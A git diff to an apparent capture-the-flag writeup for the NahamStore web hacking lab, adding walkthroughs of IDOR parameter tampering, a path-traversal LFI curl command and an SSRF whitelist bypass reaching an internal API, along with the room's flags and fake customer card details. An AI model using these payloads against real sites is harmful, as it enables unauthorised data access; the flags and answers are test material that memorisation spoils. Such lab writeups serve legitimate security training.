@@ -1,6 +1,6 @@
 # NahamStore Writeup
 
-> Machine : No machine
+> Machine : Web
 
 > In this room you will learn the basics of bug bounty hunting and web application hacking
 
@@ -199,5 +199,61 @@ The same thing when we intercept the change email page on http://nahamstore.thm/
 > 
 > base64
 
-### Task 7 ()
+### Task 7 (IDOR)
+
+When we register and add something to the basket, then intercept the POST request with Burp.
+We found a parameter `address_id=` which has your current order id. But if we try to change it we can access to other users order ids.
+
+> First Line of Address
+> 
+> 160 Broadway
+
+And there is another one. The PDF report generator took a `user_id` in the POST body with no authorization check.
+
+So if we change it and decode the `user_id` it will be looks like this: `what=order&id=3%26user_id%3d3`, we can access the order id 3.
+
+> Order ID 3 date and time
+> 
+> 22/02/2021 11:42:13
+
+### Task 8 (LFI)
+
+For this vulnerability we search for file paths from the server usually images. 
+On http://nahamstore.thm/product/picture/?file= there is a file parameter we can try and read files from the server.
+
+In this case we use:
+
+```shell
+curl "http://nahamstore.thm/product/picture/?file=....//....//....//....//....//....//....//....//lfi/flag.txt"
+```
+
+```text
+{7ef60e74b711f4c3a1fdf5a131ebf863}
+```
+
+> LFI Flag
+> 
+> {7ef60e74b711f4c3a1fdf5a131ebf863}
+
+### Task 9 (SSRF)
+
+Checking the site map in Burp we found `/stockcheck` that has a parameter `server=`.
+
+`product_id=2&server=stock.nahamstore.thm` after trying some payloads we can know that the server uses a whitelist not a blacklist. But that's does not mean it's not vulnerable.
+
+If we try `server=stock.nahamstore.thm@localhost#` to bypass it we saw it works.
+
+So now our goal is to access sensitive data. After brute forcing using intruder in Burp we found new subdomain: `server=stock.nahamstore.thm@internal-api.nahamstore.thm`. (Also we have to add it to the hosts file)
+
+Entering `server=stock.nahamstore.thm@internal-api.nahamstore.thm/orders/4dbc51716426d49f524e10d4437a5f5a#` we can found customers order data:
+
+```text
+{"id":"4dbc51716426d49f524e10d4437a5f5a", "customer":{"id":1,"name": "Rita Miles", "email": "rita.miles969@gmail.com","tel": "816-719-7115", "address": ("line 1":"3914 Charles Street", "city": "Farmington Hills", "state": "Michigan", "zipcode": "48335"), "items": [{"name":"Sticker Pack", "cost": "15.00")], "payment":{"type": "MasterCard", "number": "5376118225360051", "expires": "05\/2024","C VV2":"610")))
+```
+
+> Credit Card Number For Jimmy Jones
+> 
+> 5190216301622131
+
+### Task 10 (XXE)
 
